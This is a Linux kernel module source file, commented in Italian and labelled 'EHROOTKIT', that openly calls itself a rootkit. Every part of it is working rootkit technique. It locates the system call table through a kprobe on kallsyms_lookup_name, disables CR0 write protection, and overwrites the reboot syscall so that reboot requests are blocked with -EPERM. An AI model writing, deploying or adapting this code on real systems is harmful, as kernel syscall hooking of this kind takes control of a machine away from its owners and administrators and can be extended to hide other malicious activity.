#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>

// -------------------- Prototipi --------------------
unsigned long *get_system_call_table_address(void);
asmlinkage int hackers_reboot(int, int, int, void *);
void hook_sys_call(void);
void restore_reboot_sys_call(void);

// -------------------- Protezione CR0 --------------------
static void my_write_cr0(long value)
{
    __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
#define enable_write_protection()  my_write_cr0(read_cr0() | 0x10000)

// -------------------- Variabili globali --------------------
#define enable_reboot 0
unsigned long *sys_call_table_address;
asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);

// -------------------- Kprobe per kallsyms_lookup_name --------------------
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

unsigned long *get_system_call_table_address(void)
{
    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

// -------------------- Funzione hookata --------------------
asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg)
{
    if (enable_reboot) {
        return old_reboot_sys_call(magic1, magic2, cmd, arg);
    }

    printk(KERN_NOTICE "EHROOTKIT: Blocked reboot call\n");
    return -EPERM;
}

// -------------------- Hook e Restore --------------------
void hook_sys_call(void)
{
    old_reboot_sys_call = (int (*)(int, int, int, void *)) sys_call_table_address[__NR_reboot];

    disable_write_protection();
    sys_call_table_address[__NR_reboot] = (unsigned long) hackers_reboot;
    enable_write_protection();

    printk(KERN_NOTICE "EHROOTKIT: Hooked reboot call\n");
}

void restore_reboot_sys_call(void)
{
    disable_write_protection();
    sys_call_table_address[__NR_reboot] = (unsigned long) old_reboot_sys_call;
    enable_write_protection();

    printk(KERN_NOTICE "EHROOTKIT: Restored reboot syscall\n");
}

// -------------------- Init & Exit --------------------
static int __init startup(void)
{
    sys_call_table_address = get_system_call_table_address();
    hook_sys_call();
    return 0;
}

static void __exit shutdown(void)
{
    restore_reboot_sys_call();
}

module_init(startup);
module_exit(shutdown);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("EHROOTKIT");
MODULE_DESCRIPTION("A rootkit that blocks the reboot syscall");
